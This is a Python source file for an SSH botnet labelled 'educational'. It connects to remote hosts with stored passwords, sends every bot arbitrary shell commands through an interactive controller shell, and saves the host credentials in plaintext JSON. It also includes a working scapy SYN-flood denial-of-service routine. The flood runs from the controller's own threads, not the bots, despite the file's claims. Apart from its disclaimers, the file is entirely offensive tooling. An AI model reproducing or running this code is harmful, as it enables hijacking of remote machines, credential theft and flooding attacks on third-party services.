"""
SSH Botnet - Educational Project

DISCLAIMER: This project is for educational and ethical hacking purposes only.
Unauthorized access to systems without consent is illegal and violates cybersecurity laws.
Always obtain permission before testing these techniques on any system.

This module implements a basic SSH botnet for educational purposes to demonstrate:
- Botnet structure and SSH exploitation techniques
- Remote command execution on multiple machines
- DDoS attack simulation (SYN flood)
- Persistence mechanisms in botnets
"""

import json
import time
import threading
from typing import List, Dict, Optional
from pexpect import pxssh
from scapy.all import IP, TCP, send


class Bot:
    """Represents a single bot in the botnet."""
    
    def __init__(self, host: str, username: str, password: str):
        self.host = host
        self.username = username
        self.password = password
        self.session: Optional[pxssh.pxssh] = None
        self.connected = False
    
    def connect(self) -> bool:
        """Establish SSH connection to the bot."""
        try:
            self.session = pxssh.pxssh()
            self.session.login(self.host, self.username, self.password)
            self.connected = True
            print(f"[+] Successfully connected to {self.host}")
            return True
        except Exception as e:
            print(f"[-] Failed to connect to {self.host}: {str(e)}")
            self.connected = False
            return False
    
    def disconnect(self):
        """Close SSH connection."""
        if self.session:
            self.session.logout()
            self.connected = False
            print(f"[*] Disconnected from {self.host}")
    
    def send_command(self, command: str) -> str:
        """Send a command to the bot and return output."""
        if not self.connected or not self.session:
            return f"[-] Not connected to {self.host}"
        
        try:
            self.session.sendline(command)
            self.session.prompt()
            return self.session.before.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[-] Error executing command on {self.host}: {str(e)}"
    
    def to_dict(self) -> Dict:
        """Convert bot to dictionary for JSON serialization."""
        return {
            'host': self.host,
            'username': self.username,
            'password': self.password
        }
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'Bot':
        """Create Bot instance from dictionary."""
        return cls(data['host'], data['username'], data['password'])
    
    def __repr__(self):
        status = "Connected" if self.connected else "Disconnected"
        return f"Bot({self.host}, {self.username}, {status})"


class Botnet:
    """
    Main botnet controller class.
    Manages a collection of SSH-connected bots.
    """
    
    def __init__(self):
        self.bots: List[Bot] = []
        self.running = False
    
    def add_bot(self, host: str, username: str, password: str) -> bool:
        """
        Add a new bot to the botnet.
        
        Args:
            host: IP address or hostname of the target
            username: SSH username
            password: SSH password
        
        Returns:
            bool: True if connection successful, False otherwise
        """
        print(f"[*] Attempting to connect to {host}...")
        bot = Bot(host, username, password)
        
        if bot.connect():
            self.bots.append(bot)
            print(f"[+] Bot added successfully. Total bots: {len(self.bots)}")
            return True
        return False
    
    def list_bots(self):
        """Display all bots in the botnet."""
        if not self.bots:
            print("[-] No bots in the botnet.")
            return
        
        print("\n" + "="*60)
        print("CONNECTED BOTS")
        print("="*60)
        for i, bot in enumerate(self.bots, 1):
            status = "✓ Connected" if bot.connected else "✗ Disconnected"
            print(f"{i}. {bot.host} ({bot.username}) - {status}")
        print("="*60)
        print(f"Total bots: {len(self.bots)}")
        print()
    
    def send_command(self, command: str):
        """
        Send a command to all connected bots.
        
        Args:
            command: Command to execute on all bots
        """
        if not self.bots:
            print("[-] No bots available.")
            return
        
        print(f"\n[*] Sending command to {len(self.bots)} bot(s): {command}")
        print("="*60)
        
        for bot in self.bots:
            if bot.connected:
                print(f"\n[+] Output from {bot.host}:")
                output = bot.send_command(command)
                print(output)
            else:
                print(f"\n[-] {bot.host} is not connected.")
        
        print("="*60)
    
    def interactive_shell(self):
        """
        Open an interactive bash shell for real-time command execution.
        Type 'exit' to quit the shell.
        """
        if not self.bots:
            print("[-] No bots available.")
            return
        
        print("\n" + "="*60)
        print("INTERACTIVE BASH SHELL")
        print("Type 'exit' to quit, 'list' to show bots")
        print("="*60)
        
        while True:
            try:
                command = input("\nbotnet-shell> ").strip()
                
                if command.lower() == 'exit':
                    print("[*] Exiting interactive shell...")
                    break
                elif command.lower() == 'list':
                    self.list_bots()
                elif command:
                    self.send_command(command)
                else:
                    continue
                    
            except KeyboardInterrupt:
                print("\n[*] Exiting interactive shell...")
                break
            except Exception as e:
                print(f"[-] Error: {str(e)}")
    
    def save_botnet(self, filename: str = "botnet.json"):
        """
        Save botnet configuration to JSON file.
        
        Args:
            filename: Name of the JSON file to save
        """
        if not self.bots:
            print("[-] No bots to save.")
            return
        
        data = {
            'bots': [bot.to_dict() for bot in self.bots],
            'saved_at': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=4)
            print(f"[+] Botnet saved to {filename}")
            print(f"[*] Saved {len(self.bots)} bot(s)")
        except Exception as e:
            print(f"[-] Error saving botnet: {str(e)}")
    
    def load_botnet(self, filename: str = "botnet.json") -> int:
        """
        Load botnet configuration from JSON file and reconnect.
        
        Args:
            filename: Name of the JSON file to load
        
        Returns:
            int: Number of bots successfully reconnected
        """
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            bots_data = data.get('bots', [])
            print(f"[*] Loading {len(bots_data)} bot(s) from {filename}...")
            
            connected_count = 0
            for bot_data in bots_data:
                if self.add_bot(bot_data['host'], bot_data['username'], bot_data['password']):
                    connected_count += 1
            
            print(f"[+] Successfully reconnected to {connected_count} bot(s)")
            return connected_count
            
        except FileNotFoundError:
            print(f"[-] File {filename} not found.")
            return 0
        except Exception as e:
            print(f"[-] Error loading botnet: {str(e)}")
            return 0
    
    def ddos_attack(self, target: str, port: int = 80, duration: int = 60, threads: int = 10):
        """
        Simulate a SYN flood DDoS attack on a target.
        
        WARNING: This is for educational purposes only!
        Only use on systems you own or have explicit permission to test.
        
        Args:
            target: Target IP address
            port: Target port (default: 80)
            duration: Attack duration in seconds
            threads: Number of attack threads
        """
        if not self.bots:
            print("[-] No bots available for attack.")
            return
        
        print("\n" + "!"*60)
        print("WARNING: EDUCATIONAL USE ONLY!")
        print("Ensure you have permission to test this target!")
        print("!"*60)
        
        confirm = input(f"\nTarget: {target}:{port} for {duration}s. Confirm? (yes/no): ")
        if confirm.lower() != 'yes':
            print("[*] Attack cancelled.")
            return
        
        print(f"\n[*] Initiating SYN flood attack on {target}:{port}")
        print(f"[*] Using {len(self.bots)} bot(s) with {threads} threads each")
        print(f"[*] Attack duration: {duration} seconds")
        print("[*] Press Ctrl+C to stop early\n")
        
        self.running = True
        start_time = time.time()
        
        def syn_flood():
            """Generate SYN packets."""
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Create SYN packet with random source port
                    packet = IP(dst=target) / TCP(dport=port, flags='S')
                    send(packet, verbose=0)
                except Exception:
                    pass
        
        # Start attack threads on each bot
        attack_threads = []
        for bot in self.bots:
            for _ in range(threads):
                t = threading.Thread(target=syn_flood)
                t.daemon = True
                t.start()
                attack_threads.append(t)
        
        try:
            # Wait for duration
            while self.running and (time.time() - start_time) < duration:
                elapsed = int(time.time() - start_time)
                remaining = duration - elapsed
                print(f"\r[*] Attacking... Elapsed: {elapsed}s | Remaining: {remaining}s", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Attack stopped by user.")
        finally:
            self.running = False
            print(f"\n[*] Attack completed. Duration: {int(time.time() - start_time)} seconds")
    
    def disconnect_all(self):
        """Disconnect all bots."""
        print("[*] Disconnecting all bots...")
        for bot in self.bots:
            bot.disconnect()
        self.bots.clear()
        print("[+] All bots disconnected.")
    
    def remove_bot(self, index: int):
        """Remove a specific bot from the botnet."""
        if 0 <= index < len(self.bots):
            bot = self.bots.pop(index)
            bot.disconnect()
            print(f"[+] Removed bot {bot.host}")
        else:
            print("[-] Invalid bot index.")
